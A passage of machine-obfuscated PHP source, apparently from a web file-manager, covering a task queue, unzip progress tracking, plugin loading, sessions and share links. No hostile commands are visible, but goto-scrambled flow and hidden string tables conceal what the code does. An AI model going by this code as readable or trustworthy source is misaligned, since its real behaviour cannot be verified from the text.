goto Aë‹ĞÃì; D—Ğ‹Ò¦ñ: } public static function count() { $C¾›øĞ®— = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$C¾›øĞ®—) { return 0; } return intval($C¾›øĞ®—); } public static function getAll() { $eÑÃ™É³®  = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$eÑÃ™É³® ) { return array(); } return $eÑÃ™É³® ; } public static function setAll($b•İÑôŠËĞ) { $eÃå¿¾Ì‘ê = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($b•İÑôŠËĞ), $eÃå¿¾Ì‘ê); Cache::set(self::QUEUE_DATA, $b•İÑôŠËĞ, $eÃå¿¾Ì‘ê); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($EªñÎòÅç¥, $BÂÈŞÈ–ÍÆ = 5.0) { if (!$EªñÎòÅç¥) { return; } $c‚ÌøÙèÎù = Cache::get($EªñÎòÅç¥); if (!$c‚ÌøÙèÎù || timeFloat() - floatVal($c‚ÌøÙèÎù) >= $BÂÈŞÈ–ÍÆ) { Cache::set($EªñÎòÅç¥, timeFloat(), $BÂÈŞÈ–ÍÆ * 10); return !0; } return !1; } public static function timeLimitCall($E‹İëª¯îÏ, $Bó˜Ù§å­, $BÊ‹–à±ç™, $A…ÎÄ¼òÏ = 5.0) { goto B„¯³ÌõôÜ; eÜ§Çø£°×: Cache::set($C¶Šœ³¥Ê, $dŸ¶µ¹°óŒ, 60); Cache::removeMemory($C¶Šœ³¥Ê); write_log($E¶í™˜Òô[1604] . $E‹İëª¯îÏ . $E¶í™˜Òô[68] . $Bó˜Ù§å­, $E¶í™˜Òô[1598]); goto C·ò‰õçÄ; eàÑƒŠ™Âê: if (is_array($dŸ¶µ¹°óŒ[$E‹İëª¯îÏ])) { $A¤æò¾ì ¾[$E¶í™˜Òô[1603]] = $dŸ¶µ¹°óŒ[$E‹İëª¯îÏ][$E¶í™˜Òô[1603]]; } if (is_array($dŸ¶µ¹°óŒ[$E‹İëª¯îÏ])) { if (timeFloat() - $dŸ¶µ¹°óŒ[$E‹İëª¯îÏ][$E¶í™˜Òô[1602]] < $A¤æò¾ì ¾[$E¶í™˜Òô[196]] * 0.3) { return; } $A¤æò¾ì ¾[$E¶í™˜Òô[1603]] = $dŸ¶µ¹°óŒ[$E‹İëª¯îÏ][$E¶í™˜Òô[1603]]; } $dŸ¶µ¹°óŒ[$E‹İëª¯îÏ] = $A¤æò¾ì ¾; goto eÜ§Çø£°×; F·‡“ôïÜ¤: $C¶Šœ³¥Ê = $E¶í™˜Òô[1601]; $dŸ¶µ¹°óŒ = Cache::get($C¶Šœ³¥Ê, !0); $A¤æò¾ì ¾ = array($E¶í™˜Òô[1602] => timeFloat(), $E¶í™˜Òô[1603] => timeFloat(), $E¶í™˜Òô[261] => $Bó˜Ù§å­, $E¶í™˜Òô[1596] => $BÊ‹–à±ç™, $E¶í™˜Òô[196] => $A…ÎÄ¼òÏ); goto eàÑƒŠ™Âê; B„¯³ÌõôÜ: $E¶í™˜Òô =& $_SERVER[¬ı§†‰ú˜¼]; if (!$E‹İëª¯îÏ || !$Bó˜Ù§å­) { return; } self::$asyncAdd = !0; goto F·‡“ôïÜ¤; C·ò‰õçÄ: } public static function timeLimitCallLoop() { goto E–˜’Â×Ï; E–˜’Â×Ï: $E»Ø¢éÂÁ¹ =& $_SERVER[¬ı§†‰ú˜¼]; $BËÓÔï°Œ‘ = array($E»Ø¢éÂÁ¹[1605]); $f¯÷×çÏØË = in_array(strtolower(ACTION), $BËÓÔï°Œ‘); goto eë¦¡¢«ùá; BÃ¯£åé×¾: if (!$c±¡”Ÿ²ÀÒ || count($c±¡”Ÿ²ÀÒ) <= 0) { return; } $a™ÄÖğ¸õô = !1; $E‘´ŞÓÛÑÁ = timeFloat(); goto c©‘èÕ¿¾Ë; c©‘èÕ¿¾Ë: $aô”£ìÃ = array(); foreach ($c±¡”Ÿ²ÀÒ as $AË‘™¤îÀ‘ => $aÖ¯…ä™½£) { if ($E‘´ŞÓÛÑÁ - $aÖ¯…ä™½£[$E»Ø¢éÂÁ¹[1603]] > $aÖ¯…ä™½£[$E»Ø¢éÂÁ¹[196]]) { $a™ÄÖğ¸õô = !0; try { Hook::apply($aÖ¯…ä™½£[$E»Ø¢éÂÁ¹[261]], $aÖ¯…ä™½£[$E»Ø¢éÂÁ¹[1596]]); write_log($E»Ø¢éÂÁ¹[1606] . $AË‘™¤îÀ‘ . $E»Ø¢éÂÁ¹[68] . $aÖ¯…ä™½£[$E»Ø¢éÂÁ¹[261]] . $E»Ø¢éÂÁ¹[1607] . ACTION, $E»Ø¢éÂÁ¹[1598]); } catch (Exception $fÎ¯ƒ¯çåŸ) { } continue; } $aô”£ìÃ[$AË‘™¤îÀ‘] = $aÖ¯…ä™½£; } if (!$a™ÄÖğ¸õô) { return; } goto E¼ÉÙ©Ğªí; E¼ÉÙ©Ğªí: if (!$aô”£ìÃ) { return Cache::remove($d“œ¬¿î£“); } Cache::set($d“œ¬¿î£“, $aô”£ìÃ, 60); Cache::removeMemory($d“œ¬¿î£“); goto cÂ­ƒÂŞùÏ; eë¦¡¢«ùá: if (!$f¯÷×çÏØË && !self::$asyncAdd) { return; } $d“œ¬¿î£“ = $E»Ø¢éÂÁ¹[1601]; $c±¡”Ÿ²ÀÒ = Cache::get($d“œ¬¿î£“, !0); goto BÃ¯£åé×¾; cÂ­ƒÂŞùÏ: } public static function finished($E¥÷¢°Šìµ, $f†äğáÔ„) { $cñØ¸”ò· =& $_SERVER[¬ı§†‰ú˜¼]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($cñØ¸”ò·[261] => $E¥÷¢°Šìµ, $cñØ¸”ò·[1596] => $f†äğáÔ„); } private static function finishedRun() { $aš‘™äÀç¾ =& $_SERVER[¬ı§†‰ú˜¼]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $fÊ‡éÊ„Â) { try { Hook::apply($fÊ‡éÊ„Â[$aš‘™äÀç¾[261]], $fÊ‡éÊ„Â[$aš‘™äÀç¾[1596]]); } catch (Exception $Dìà³ŠÉÏä) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto A³„ùØˆ¤Ø; FŸãÊ©õƒ: Hook::bind($aè¨ÛŠö•ø[1088], array($this, $aè¨ÛŠö•ø[1610])); $fòí‡´òÈß =& $this->task; $fòí‡´òÈß[$aè¨ÛŠö•ø[1611]] = $aè¨ÛŠö•ø[1093]; goto eŒŸƒ¥ƒ±‚; A³„ùØˆ¤Ø: $aè¨ÛŠö•ø =& $_SERVER[¬ı§†‰ú˜¼]; parent::startAfter(); Hook::bind($aè¨ÛŠö•ø[1608], array($this, $aè¨ÛŠö•ø[1609])); goto FŸãÊ©õƒ; eŒŸƒ¥ƒ±‚: if (!$fòí‡´òÈß[$aè¨ÛŠö•ø[1431]]) { $fòí‡´òÈß[$aè¨ÛŠö•ø[1431]] = LNG($aè¨ÛŠö•ø[1612]); } goto E†˜¤âÛö; E†˜¤âÛö: } protected function endAfter() { $bêÃ‘²²Ô™ =& $_SERVER[¬ı§†‰ú˜¼]; parent::endAfter(); Hook::unbind($bêÃ‘²²Ô™[1608], array($this, $bêÃ‘²²Ô™[1609])); Hook::unbind($bêÃ‘²²Ô™[1088], array($this, $bêÃ‘²²Ô™[1610])); } public function updateAfter() { $E÷ŞŒèº =& $_SERVER[¬ı§†‰ú˜¼]; $A¹×ˆ¤å§ =& $this->task; if (!$A¹×ˆ¤å§[$E÷ŞŒèº[1020]] || !$A¹×ˆ¤å§[$E÷ŞŒèº[724]]) { return; } if ($A¹×ˆ¤å§[$E÷ŞŒèº[1611]] == $E÷ŞŒèº[1093]) { $E³Š’†ç— = 0; if ($A¹×ˆ¤å§[$E÷ŞŒèº[1570]]) { $E³Š’†ç— = $A¹×ˆ¤å§[$E÷ŞŒèº[1571]] / $A¹×ˆ¤å§[$E÷ŞŒèº[1570]]; } $A¹×ˆ¤å§[$E÷ŞŒèº[1528]] = $E³Š’†ç— * 0.3; } else { if ($A¹×ˆ¤å§[$E÷ŞŒèº[1611]] == $E÷ŞŒèº[310]) { $E³Š’†ç— = $A¹×ˆ¤å§[$E÷ŞŒèº[1035]] / $A¹×ˆ¤å§[$E÷ŞŒèº[1020]]; $A¹×ˆ¤å§[$E÷ŞŒèº[1528]] = 0.3 + $E³Š’†ç— * 0.4; } else { if ($A¹×ˆ¤å§[$E÷ŞŒèº[1611]] == $E÷ŞŒèº[107]) { $Eóˆï™Ê…È = 0; if ($A¹×ˆ¤å§[$E÷ŞŒèº[1572]] == $E÷ŞŒèº[107]) { $Eóˆï™Ê…È = $A¹×ˆ¤å§[$E÷ŞŒèº[1571]]; } $E³Š’†ç— = ($A¹×ˆ¤å§[$E÷ŞŒèº[1575]] + $Eóˆï™Ê…È) / $A¹×ˆ¤å§[$E÷ŞŒèº[724]]; $A¹×ˆ¤å§[$E÷ŞŒèº[1528]] = 0.3 + 0.4 + $E³Š’†ç— * 0.3; } } } if ($A¹×ˆ¤å§[$E÷ŞŒèº[1528]] > 0) { $f˜Ú‘ÅŒ¬ç = timeFloat() - $A¹×ˆ¤å§[$E÷ŞŒèº[750]] - $A¹×ˆ¤å§[$E÷ŞŒèº[1531]]; $A¹×ˆ¤å§[$E÷ŞŒèº[1532]] = $f˜Ú‘ÅŒ¬ç * (1 - $A¹×ˆ¤å§[$E÷ŞŒèº[1528]]) / $A¹×ˆ¤å§[$E÷ŞŒèº[1528]]; } } public function addFile($aµÉŠªˆ¶ø) { goto EÃÎ ÑÆ; FÏÆ£Ë¾Ğâ: $this->update(); goto B•¨×¹†; féöÔƒ×¸‘: $aÜ¬‰´ˆ²ò[$aà‚íãİ¶[1568]] = $cõ›³´ğº[$aà‚íãİ¶[28]]; $aÜ¬‰´ˆ²ò[$aà‚íãİ¶[1570]] = $cõ›³´ğº[$aà‚íãİ¶[78]]; $aÜ¬‰´ˆ²ò[$aà‚íãİ¶[1571]] = 0; goto d®‹ÓÜ…¯Ò; f¿‡Œ‘ÊÁ¯: $aÜ¬‰´ˆ²ò[$aà‚íãİ¶[1020]] = 1; $báßÇªÎ = 0; $aÜ¬‰´ˆ²ò[$aà‚íãİ¶[1579]] = array($aà‚íãİ¶[1580] => $báßÇªÎ + 1, $aà‚íãİ¶[411] => $cõ›³´ğº[$aà‚íãİ¶[28]], $aà‚íãİ¶[76] => $cõ›³´ğº[$aà‚íãİ¶[76]], $aà‚íãİ¶[493] => $cõ›³´ğº[$aà‚íãİ¶[493]] ? $cõ›³´ğº[$aà‚íãİ¶[493]] : $cõ›³´ğº[$aà‚íãİ¶[76]]); goto FÏÆ£Ë¾Ğâ; d®‹ÓÜ…¯Ò: $aÜ¬‰´ˆ²ò[$aà‚íãİ¶[1022]] = $aà‚íãİ¶[1587]; $aÜ¬‰´ˆ²ò[$aà‚íãİ¶[1572]] = $aà‚íãİ¶[1093]; $aÜ¬‰´ˆ²ò[$aà‚íãİ¶[724]] = $cõ›³´ğº[$aà‚íãİ¶[78]]; goto f¿‡Œ‘ÊÁ¯; EÃÎ ÑÆ: $aà‚íãİ¶ =& $_SERVER[¬ı§†‰ú˜¼]; $aÜ¬‰´ˆ²ò =& $this->task; $cõ›³´ğº = IO::info($aµÉŠªˆ¶ø); goto féöÔƒ×¸‘; B•¨×¹†: } public function unzipAfter($DÔ…¼×Á¼Ú) { goto C‹åˆèğŠƒ; C‹åˆèğŠƒ: $Cùµ÷ì™ÙÍ =& $_SERVER[¬ı§†‰ú˜¼]; $EÖàŠ¥¿Æ‘ =& $this->task; $EÖàŠ¥¿Æ‘[$Cùµ÷ì™ÙÍ[1611]] = $Cùµ÷ì™ÙÍ[107]; goto EÈäõ“·œ¸; cé…˜ĞåÔÄ: $EÖàŠ¥¿Æ‘[$Cùµ÷ì™ÙÍ[1568]] = $Cùµ÷ì™ÙÍ[33]; $EÖàŠ¥¿Æ‘[$Cùµ÷ì™ÙÍ[1575]] = 0; $EÖàŠ¥¿Æ‘[$Cùµ÷ì™ÙÍ[724]] = $eƒÑèæ‰¤ô[$Cùµ÷ì™ÙÍ[78]]; goto Aô—¢°„µç; AÂì¾µ¼ó¾: $EÖàŠ¥¿Æ‘[$Cùµ÷ì™ÙÍ[1035]] = 0; $EÖàŠ¥¿Æ‘[$Cùµ÷ì™ÙÍ[1570]] = 0; $EÖàŠ¥¿Æ‘[$Cùµ÷ì™ÙÍ[1571]] = 0; goto cé…˜ĞåÔÄ; EÈäõ“·œ¸: $eƒÑèæ‰¤ô = IO::infoWithChildren($DÔ…¼×Á¼Ú); $cÉ˜İÕÃ´¥ = 0; $EÖàŠ¥¿Æ‘[$Cùµ÷ì™ÙÍ[1579]] = array($Cùµ÷ì™ÙÍ[1580] => $cÉ˜İÕÃ´¥ + 1, $Cùµ÷ì™ÙÍ[411] => $eƒÑèæ‰¤ô[$Cùµ÷ì™ÙÍ[28]], $Cùµ÷ì™ÙÍ[76] => $eƒÑèæ‰¤ô[$Cùµ÷ì™ÙÍ[76]], $Cùµ÷ì™ÙÍ[493] => $eƒÑèæ‰¤ô[$Cùµ÷ì™ÙÍ[493]] ? $eƒÑèæ‰¤ô[$Cùµ÷ì™ÙÍ[493]] : $eƒÑèæ‰¤ô[$Cùµ÷ì™ÙÍ[76]]); goto fùÒ‹ÃáÅ¸; fùÒ‹ÃáÅ¸: if ($eƒÑèæ‰¤ô[$Cùµ÷ì™ÙÍ[29]] == $Cùµ÷ì™ÙÍ[192]) { $EÖàŠ¥¿Æ‘[$Cùµ÷ì™ÙÍ[1020]] = 1; } else { $EÖàŠ¥¿Æ‘[$Cùµ÷ì™ÙÍ[1020]] = $eƒÑèæ‰¤ô[$Cùµ÷ì™ÙÍ[81]][$Cùµ÷ì™ÙÍ[79]]; } $EÖàŠ¥¿Æ‘[$Cùµ÷ì™ÙÍ[1022]] = $Cùµ÷ì™ÙÍ[33]; $EÖàŠ¥¿Æ‘[$Cùµ÷ì™ÙÍ[1572]] = 0; goto AÂì¾µ¼ó¾; Aô—¢°„µç: $this->update(); self::log($Cùµ÷ì™ÙÍ[1613] . json_encode(array($EÖàŠ¥¿Æ‘, $eƒÑèæ‰¤ô))); goto dæå¢¨´¸; dæå¢¨´¸: } public function nameParse($D½ôÚá†¿) { goto cÃµˆ†‡™µ; fº³ŒÇÖ¶‘: $C’ÌÜÙÛ´Å = get_path_this($D½ôÚá†¿); if (strstr($C’ÌÜÙÛ´Å, $F˜ìõ´£¼[95])) { $eï¯ï§¡¤[$F˜ìõ´£¼[1035]] += 1; $eï¯ï§¡¤[$F˜ìõ´£¼[1020]] += 1; } $eï¯ï§¡¤[$F˜ìõ´£¼[1568]] = $D½ôÚá†¿; goto FÙ£ ³ìÊâ; FÙ£ ³ìÊâ: $this->update(); goto d¢ëÉ„Ñîá; cÃµˆ†‡™µ: $F˜ìõ´£¼ =& $_SERVER[¬ı§†‰ú˜¼]; $eï¯ï§¡¤ =& $this->task; if ($eï¯ï§¡¤[$F˜ìõ´£¼[1611]] == $F˜ìõ´£¼[1093]) { $eï¯ï§¡¤[$F˜ìõ´£¼[1611]] = $F˜ìõ´£¼[310]; $eï¯ï§¡¤[$F˜ìõ´£¼[1575]] = 0; $eï¯ï§¡¤[$F˜ìõ´£¼[724]] = 0; } goto fº³ŒÇÖ¶‘; d¢ëÉ„Ñîá: } } goto DÂèŠÆ•…; eÍ¢°ˆˆ‘Û: define($_SERVER[¬ı§†‰ú˜¼][236], 2); define($_SERVER[¬ı§†‰ú˜¼][237], 3); define($_SERVER[¬ı§†‰ú˜¼][238], 1); goto eŒ†‡Ú•ç°; Bù¾†Èê¶è: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\x70\x6c\x75\147\x69\x6e\114\151\163\164"; public $field = array("\156\141\155\x65", "\x73\x74\x61\164\165\163", "\162\x65\147\151\x65\163\x74", "\x63\157\156\146\151\147"); public function loadList($f”æô–×™ë = false) { $EçôÛ—”’Á = array_to_keyvalue($this->listData(), $_SERVER[¬ı§†‰ú˜¼][28]); if ($f”æô–×™ë) { return $EçôÛ—”’Á[$f”æô–×™ë]; } return $EçôÛ—”’Á; } public function init() { $C‡ŠÙ©ê˜¨ =& $_SERVER[¬ı§†‰ú˜¼]; Hook::trigger($C‡ŠÙ©ê˜¨[1801]); $EºÕö‹î£Ÿ = $this->loadPluginList(); foreach ($EºÕö‹î£Ÿ as $C’î¯”…ÍÁ => $C”ÙÆ²»è±) { $D…ó¨Œºµ¨ = $this->appAllow($C’î¯”…ÍÁ, $C”ÙÆ²»è±); if (!$D…ó¨Œºµ¨) { continue; } foreach ($C”ÙÆ²»è±[$C‡ŠÙ©ê˜¨[1802]] as $aæÈ¶Ò¨®é => $d¢‚˜á¸ï’) { Hook::bind($aæÈ¶Ò¨®é, $d¢‚˜á¸ï’); } } Hook::trigger($C‡ŠÙ©ê˜¨[1803]); Hook::trigger(ACTION); } public function appAllow($f×²ÔáÑ’ï, $d‡çïŠ±µÈ, $F¬°Û©«’à = true) { $bÒÉ¬íäÇ =& $_SERVER[¬ı§†‰ú˜¼]; $Dç„ÊÉÄ— = PLUGIN_DIR . $f×²ÔáÑ’ï . $bÒÉ¬íäÇ[1804]; if (!is_array($d‡çïŠ±µÈ) || !is_array($d‡çïŠ±µÈ[$bÒÉ¬íäÇ[1802]]) || $d‡çïŠ±µÈ[$bÒÉ¬íäÇ[714]] != 1 || !is_file($Dç„ÊÉÄ—)) { return !1; } if ($GLOBALS[$bÒÉ¬íäÇ[483]] == 1) { return !0; } if ($F¬°Û©«’à && !Action($bÒÉ¬íäÇ[1805])->checkAuth($f×²ÔáÑ’ï)) { return !1; } return !0; } public function unInstall($cã÷ª¡ùëŸ) { $Aî£óŞÔÙó =& $_SERVER[¬ı§†‰ú˜¼]; $AºÒ°Ş‚» = $this->loadList($cã÷ª¡ùëŸ); if (file_exists(PLUGIN_DIR . $cã÷ª¡ùëŸ)) { Hook::apply($cã÷ª¡ùëŸ . $Aî£óŞÔÙó[1806]); } $this->remove($AºÒ°Ş‚»[$Aî£óŞÔÙó[392]]); } public function changeStatus($DØÌÖ“ Åá, $dÃªêŠÉ÷ë) { $b„œÍèÖŸˆ =& $_SERVER[¬ı§†‰ú˜¼]; $dÇÔƒ‚£ò = $this->loadList($DØÌÖ“ Åá); if ($dÃªêŠÉ÷ë) { Hook::apply($DØÌÖ“ Åá . $b„œÍèÖŸˆ[1807]); } $this->update($dÇÔƒ‚£ò[$b„œÍèÖŸˆ[392]], array($b„œÍèÖŸˆ[1808] => $dÃªêŠÉ÷ë)); } public function appRegist($DŠÒ¥Ô˜–š, $Cö˜ÏŠ¥÷) { $CÅØõ‹È‰é =& $_SERVER[¬ı§†‰ú˜¼]; $eâ¢§ã­¹ = $this->loadList($DŠÒ¥Ô˜–š); if ($eâ¢§ã­¹) { $this->update($eâ¢§ã­¹[$CÅØõ‹È‰é[392]], array($CÅØõ‹È‰é[1802] => $Cö˜ÏŠ¥÷)); } else { $D™çµæ‘ÚÙ = array($CÅØõ‹È‰é[28] => $DŠÒ¥Ô˜–š, $CÅØõ‹È‰é[1802] => $Cö˜ÏŠ¥÷, $CÅØõ‹È‰é[714] => 0, $CÅØõ‹È‰é[6] => $this->getConfigDefault($DŠÒ¥Ô˜–š)); $this->insert($D™çµæ‘ÚÙ); } } public function getConfigDefault($EÚğÔƒòÇã) { $d¨İç­®ğô =& $_SERVER[¬ı§†‰ú˜¼]; $cê°Ä˜ø‚‡ = array(); $e´–Ÿšê¾ = $this->getPackageJson($EÚğÔƒòÇã); if (!$e´–Ÿšê¾ && is_array($e´–Ÿšê¾[$d¨İç­®ğô[1809]])) { return $cê°Ä˜ø‚‡; } foreach ($e´–Ÿšê¾[$d¨İç­®ğô[1809]] as $dÎ¤ç²ÒŒß => $D”‚œ®…Úƒ) { if (!isset($D”‚œ®…Úƒ[$d¨İç­®ğô[371]]) || isset($cê°Ä˜ø‚‡[$dÎ¤ç²ÒŒß])) { continue; } $cê°Ä˜ø‚‡[$dÎ¤ç²ÒŒß] = $D”‚œ®…Úƒ[$d¨İç­®ğô[371]]; } return $cê°Ä˜ø‚‡; } public function getPackageJson($CÔïÒÁ›á) { return Hook::apply($CÔïÒÁ›á . $_SERVER[¬ı§†‰ú˜¼][1810]); } public function getConfig($D Î˜ˆÌÏ, $B¯„ŞÄĞ = false) { $e¶šöİëÕø =& $_SERVER[¬ı§†‰ú˜¼]; $d¼é…ì¸ÑÇ = array(); $c…Šã´¤È× = $this->loadList($D Î˜ˆÌÏ); if ($c…Šã´¤È× && is_array($c…Šã´¤È×[$e¶šöİëÕø[6]])) { $d¼é…ì¸ÑÇ = $c…Šã´¤È×[$e¶šöİëÕø[6]]; } if (!$d¼é…ì¸ÑÇ || $B¯„ŞÄĞ) { $d¼é…ì¸ÑÇ = $this->getConfigDefault($D Î˜ˆÌÏ); } return $d¼é…ì¸ÑÇ; } public function setConfig($b‹Ú¤­Æà, $B†‹—ç†ĞŠ = false) { goto dÊŸ¥²Ó; F‚«§‹¶öÓ: $this->update($aŸå•Á—Ğ[$Bº–›©İ‚Ì[392]], array($Bº–›©İ‚Ì[6] => $f­£ à³À‹)); goto DÉÛã½•Õó; D‘Œàƒ÷„â: $f­£ à³À‹ = $aŸå•Á—Ğ[$Bº–›©İ‚Ì[6]]; if ($B†‹—ç†ĞŠ == !1) { $f­£ à³À‹ = array(); $B†‹—ç†ĞŠ = $this->getConfigDefault($b‹Ú¤­Æà); } foreach ($B†‹—ç†ĞŠ as $Då–Äàöñé => $Eå±œŠÊª¬) { $f­£ à³À‹[$Då–Äàöñé] = is_string($Eå±œŠÊª¬) ? trim($Eå±œŠÊª¬) : $Eå±œŠÊª¬; } goto F‚«§‹¶öÓ; dÊŸ¥²Ó: $Bº–›©İ‚Ì =& $_SERVER[¬ı§†‰ú˜¼]; $aŸå•Á—Ğ = $this->loadList($b‹Ú¤­Æà); if (!$aŸå•Á—Ğ) { return !1; } goto D‘Œàƒ÷„â; DÉÛã½•Õó: } public function viewList() { goto b¼õ—®šÁÚ; b¼õ—®šÁÚ: $b¾¡ùŸ¿šÙ =& $_SERVER[¬ı§†‰ú˜¼]; $dœˆ¹øÎêí = $this->loadList(); $this->pluginScan($dœˆ¹øÎêí); goto e¢‘™ğŞê; e¢‘™ğŞê: $dœˆ¹øÎêí = $this->loadPluginList(); $EœåÎ–ºîö = array(); foreach ($dœˆ¹øÎêí as $e®áÍÉ­¤õ => $f°Ò‚èôÀí) { unset($f°Ò‚èôÀí[$b¾¡ùŸ¿šÙ[1802]], $f°Ò‚èôÀí[$b¾¡ùŸ¿šÙ[6]]); $C»±ËÒšª = PLUGIN_DIR . $f°Ò‚èôÀí[$b¾¡ùŸ¿šÙ[28]] . $b¾¡ùŸ¿šÙ[1804]; if (!is_file($C»±ËÒšª)) { continue; } $D”öˆÃõì„ = Hook::apply($f°Ò‚èôÀí[$b¾¡ùŸ¿šÙ[28]] . $b¾¡ùŸ¿šÙ[1810]); if (is_array($D”öˆÃõì„)) { $EœåÎ–ºîö[$e®áÍÉ­¤õ] = array_merge($f°Ò‚èôÀí, $D”öˆÃõì„); } } goto fŒ¸èØË¨İ; fŒ¸èØË¨İ: return $EœåÎ–ºîö; goto e¸ç„§Æƒ; e¸ç„§Æƒ: } private function loadPluginList() { $fß”†¶µ£‹ =& $_SERVER[¬ı§†‰ú˜¼]; $a‰®êè¿‚‹ = $this->loadList(); if (strtolower(MOD) == $fß”†¶µ£‹[1811]) { return $a‰®êè¿‚‹; } $CŠßæÈ‹‡Ø = Hook::trigger($fß”†¶µ£‹[1812], $a‰®êè¿‚‹); if ($a‰®êè¿‚‹ && !$CŠßæÈ‹‡Ø) { die; } return $CŠßæÈ‹‡Ø ? $CŠßæÈ‹‡Ø : $a‰®êè¿‚‹; } private function pluginScan($bÌ×É¬ùèí) { $F»•Æëö¤± =& $_SERVER[¬ı§†‰ú˜¼]; recursion_dir(PLUGIN_DIR, $eÙ´‹çÀ“, $b„ÁÈÑ—¹È, 0); foreach ($eÙ´‹çÀ“ as $EÍ‡é’¬Ó) { $C³¿ƒ­ğƒæ = get_path_this($EÍ‡é’¬Ó); if (isset($bÌ×É¬ùèí[$C³¿ƒ­ğƒæ]) || !file_exists($EÍ‡é’¬Ó . $F»•Æëö¤±[1813]) || !file_exists($EÍ‡é’¬Ó . $F»•Æëö¤±[1804])) { continue; } Hook::apply($C³¿ƒ­ğƒæ . $F»•Æëö¤±[1807]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\155\137\x73\145\163\x73\x69\x6f\x6e"; public function get($aîŠó¹İˆ°) { $b‡§¶Œ”Şè =& $_SERVER[¬ı§†‰ú˜¼]; $EæËºãÇä¥ = $this->where(array($b‡§¶Œ”Şè[1814] => $aîŠó¹İˆ°))->find(); if (!is_array($EæËºãÇä¥)) { return !1; } return $EæËºãÇä¥[$b‡§¶Œ”Şè[717]]; } public function set($cÜö—ñØ§Æ, $B²¨õ®¿³Ó, $dÂíç¡†ò˜ = 3600) { $fåæ…À¸ˆ” =& $_SERVER[¬ı§†‰ú˜¼]; $cåìô”ßÇœ = array($fåæ…À¸ˆ”[1814] => $cÜö—ñØ§Æ, $fåæ…À¸ˆ”[1723] => $B²¨õ®¿³Ó, $fåæ…À¸ˆ”[1815] => $dÂíç¡†ò˜ + time()); if (Session::get($fåæ…À¸ˆ”[1816])) { $cåìô”ßÇœ[$fåæ…À¸ˆ”[1527]] = Session::get($fåæ…À¸ˆ”[1816]); } else { $cåìô”ßÇœ[$fåæ…À¸ˆ”[1527]] = 0; } if ($this->get($cÜö—ñØ§Æ)) { return $this->where(array($fåæ…À¸ˆ”[1814] => $cÜö—ñØ§Æ))->save($cåìô”ßÇœ); } else { return $this->add($cåìô”ßÇœ, array(), !0); } } public function remove($A¸­à¾ÑØÙ) { return $this->where(array($_SERVER[¬ı§†‰ú˜¼][1814] => $A¸­à¾ÑØÙ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¬ı§†‰ú˜¼][1817] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\x79\124\151\155\x65", "\x74\x69\155\145", "\151\156\163\145\162\x74\54\165\160\144\141\x74\145", "\146\x75\156\143\164\151\157\156"), array("\x63\x72\145\141\x74\x65\x54\x69\x6d\x65", "\164\x69\x6d\145", "\x69\156\163\145\x72\x74", "\x66\x75\156\143\x74\151\x6f\156"), array("\157\x70\164\151\157\156\x73", '', "\151\x6e\163\x65\162\x74\54\x75\160\x64\141\x74\145\x2c\x73\x65\154\x65\143\164", "\x6a\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($Eœ¬à¨“Ì) { $bŞõ§´¥› =& $_SERVER[¬ı§†‰ú˜¼]; $bÖˆ“‰…Î® = isset($Eœ¬à¨“Ì[0]) ? $Eœ¬à¨“Ì[0] : !1; return array($bŞõ§´¥›[1818] => array(USER_ID, $bŞõ§´¥›[1819]), $bŞõ§´¥›[1762] => array($bÖˆ“‰…Î®, $bŞõ§´¥›[1820])); } protected function listSimple() { $d¯·œ¦Î‡ = array($_SERVER[¬ı§†‰ú˜¼][1527] => USER_ID); $Cæõ—ãà‰É = $this->field($this->fieldList)->where($d¯·œ¦Î‡)->select(); return $Cæõ—ãà‰É ? $Cæõ—ãà‰É : array(); } protected function getInfo($E„ª‹“‚Ï‘, $E†ÛÃ¶‰ƒ = false) { $f¯Ë×‚á =& $_SERVER[¬ı§†‰ú˜¼]; if ($E†ÛÃ¶‰ƒ) { return $this->_getShareInfo(array($f¯Ë×‚á[466] => $E„ª‹“‚Ï‘)); } $fƒâÏ”«Şˆ = $this->cacheFunctionGet($f¯Ë×‚á[1769], $E„ª‹“‚Ï‘); return $fƒâÏ”«Şˆ; } public function getInfoByHash($CÖ†Ø°¤¾) { return $this->_getShareInfo(array($_SERVER[¬ı§†‰ú˜¼][468] => $CÖ†Ø°¤¾)); } public function getInfoByPath($Eß•êÙÑ’) { $Açî‰ÍÍ…Ø =& $_SERVER[¬ı§†‰ú˜¼]; $bˆ¹èã³âÈ = array($Açî‰ÍÍ…Ø[1527] => USER_ID, $Açî‰ÍÍ…Ø[394] => $Eß•êÙÑ’); return $this->_getShareInfo($bˆ¹èã³âÈ); } public function getInfoBySourcePath($còÀàÊùÁï) { $c”Ø ‰šƒ =& $_SERVER[¬ı§†‰ú˜¼]; $BŒèƒ§»à‰ = array($c”Ø ‰šƒ[1527] => USER_ID, $c”Ø ‰šƒ[1070] => $còÀàÊùÁï); return $this->_getShareInfo($BŒèƒ§»à‰); } private function _getShareInfo($CÊ§¶ÈÕñ) { goto e¡ó¾Ä¾Šå; e¡ó¾Ä¾Šå: $Dª†šğñ’§ =& $_SERVER[¬ı§†‰ú˜¼]; $AÜïãåëÊ = $this->where($CÊ§¶ÈÕñ)->find(); if (!$AÜïãåëÊ) { return !1; } goto Eº„ÇéØÓã; AÏã™È„ĞÕ: if ($AÜïãåëÊ[$Dª†šğñ’§[394]] == $Dª†šğñ’§[495]) { $AÜïãåëÊ[$Dª†šğñ’§[85]] = IO::info($AÜïãåëÊ[$Dª†šğñ’§[1070]]); } else { $AÜïãåëÊ[$Dª†šğñ’§[85]] = Model($Dª†šğñ’§[1204])->pathInfo($AÜïãåëÊ[$Dª†šğñ’§[394]]); 